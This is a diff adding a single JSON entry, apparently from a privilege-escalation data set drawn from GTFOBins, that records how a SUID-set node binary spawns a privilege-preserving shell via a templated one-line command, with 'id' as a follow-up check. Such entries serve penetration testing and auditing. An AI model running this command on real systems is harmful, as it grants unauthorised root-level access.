@@ -1,0 +1,11 @@
+{
+  "id": "suid_node",
+  "category": "SUID_GTFOBINS",
+  "binary": "node",
+  "cve": null,
+  "exploitation": ["{{binary}} -e 'require(\"child_process\").spawn(\"{{shell}}\", [\"-p\"], {stdio: [0, 1, 2]})'"],
+  "post_exploit": ["id"],
+  "source": "gtfobins.github.io",
+  "tags": ["suid", "gtfobins"],
+  "severity": "high"
+}
